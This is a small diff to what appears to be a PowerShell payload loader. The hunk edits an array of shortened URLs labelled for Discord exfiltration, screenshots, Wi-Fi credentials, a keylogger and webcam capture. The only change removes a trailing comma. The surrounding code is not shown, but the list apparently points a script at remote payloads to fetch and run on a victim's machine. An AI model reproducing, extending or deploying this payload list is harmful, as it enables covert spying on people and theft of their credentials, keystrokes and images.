@@ -7,7 +7,7 @@ $payloads = @(
     "https://is.gd/bwchdbdc",
     "https://is.gd/3RVLLl", # exf dis
     "https://is.gd/8SpcqN", # ss 
-    "https://is.gd/b6GaOU", # wifi
+    "https://is.gd/b6GaOU" # wifi
     # "https://is.gd/kRX8yM", old master
     # "https://is.gd/iDZWzF", # keylogger
     # "https://is.gd/9eLMGc" # webcam
